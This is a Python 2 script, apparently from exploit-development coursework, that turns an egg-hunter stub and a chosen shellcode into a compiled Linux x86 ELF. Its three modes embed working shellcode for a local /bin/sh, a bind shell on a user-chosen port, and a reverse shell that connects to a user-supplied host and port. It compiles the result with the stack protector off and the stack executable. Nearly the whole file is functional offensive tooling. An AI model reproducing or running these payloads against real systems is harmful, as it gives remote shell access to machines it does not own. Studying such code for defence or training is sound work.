#!/usr/bin/python

#####	Generate an executable 		

def generateElf(shellcode):
	print "\n[+] Staged Shellcode Length: %d\n" % len(bytearray(shellcode))
	sc = ""
	for c in bytearray(shellcode):
		sc += "\\x%02x" % c
	print sc

	egg = ""
	for c in range(0, 8, 2):
		egg += "\\x%s%s" % (args.egg[c], args.egg[c+1])
	print "\n[+] Egg: %s" % egg

	skeleton = '''
	#include<stdio.h>
	#include<string.h>
	#define EGG "__EGG__"
	unsigned char code[] = EGG EGG "__SHELLCODE__";
	unsigned char hunter[] = \\
		"\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74"
		"\\xf1\\xb8"   EGG  "\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7";
	main() {
		printf("Hunter Shellcode Length:  %d\\n", strlen(hunter));
		int (*ret)() = (int(*)())hunter;
		ret();
	}	
	'''

	skeleton = skeleton.replace("__EGG__", egg)
	skeleton = skeleton.replace("__SHELLCODE__", sc)

	with open("a.c", "w") as f:
		f.write(skeleton)

	os.system("gcc a.c -fno-stack-protector -z execstack")
	os.rename("a.out", args.outfile)
	os.rename("a.c", "%s.c" % args.outfile)

	print "\n[+] Executable: %s\n" % args.outfile


def execShellcode(args):

	shellcode = (
		"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d"
		"\x1c\x24\x50\x8d\x14\x24\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
	)

	generateElf(shellcode)


def bindShellcode(args):

	if args.lport not in range(1,65536):
		sys.exit("[!] Bad LPORT!")

	port = struct.pack(">H", int(args.lport))

	shellcode = (
		"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xb3\x01"
		"\xb0\x66\xcd\x80\x89\xc6\x31\xc0\xb0\x01\x50\x89\xe1\x51"
		"\x40\x50\x48\x50\x56\x89\xe1\xb3\x0e\xb0\x66\xcd\x80\x31"
		"\xc0\x50\x66\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51"
		"\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80\x66\x68\x02\x10\x56"
		"\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89"
		"\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc7\x31\xc9\xb1\x02\x89"
		"\xfb\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68"
		"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2"
		"\x53\x89\xe1\xb0\x0b\xcd\x80\xe9\x76\xff\xff\xff"
		)

	generateElf(shellcode)


def revShellcode(args):

	if len(args.lhost.split(".")) != 4: 
		sys.exit("[!] Bad LHOST!")

	if args.lport not in range(1,65536):
		sys.exit("[!] Bad LPORT!")

	host = ""
	addr = args.lhost.split(".")
	for a in addr:
		host += struct.pack(">B", int(a))

	port = struct.pack(">H", int(args.lport))

	shellcode = (
		"\x31\xc0\x31\xdb\x6a\x06\x6a\x01\x6a\x02\x89\xe1"
		"\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x68"+host+"\x66"
		"\x68"+port+"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56"
		"\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\xb1\x02"
		"\x89\xf3\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31"
		"\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
		"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
		)

	generateElf(shellcode)


import sys
import os
import struct
import argparse

a = argparse.ArgumentParser()
suba = a.add_subparsers()

execa = suba.add_parser("exec")
execa.set_defaults(func=execShellcode)

binda = suba.add_parser("bind")
binda.add_argument("--lport", "-p", type=int, required=True, help="LPORT (must be between 1 and 65535)")
binda.set_defaults(func=bindShellcode)

reva = suba.add_parser("reverse")
reva.add_argument("--lhost", "-l", required=True, help="LHOST (must be IPv4)")
reva.add_argument("--lport", "-p", type=int, required=True, help="LPORT (must be between 1 and 65535)")
reva.set_defaults(func=revShellcode)

a.add_argument("--egg", "-e", default="41414141", help="EGG to hunt (must be 8 bytes; default: 41414141)")
a.add_argument("--outfile", "-o", default="hunter", help="Output ELF executable filename (default: hunter)")

args = a.parse_args()
print "\n",args,"\n"

error = False
if len(args.egg) != 8: 
	sys.exit("[!] Bad EGG!")

args.func(args)
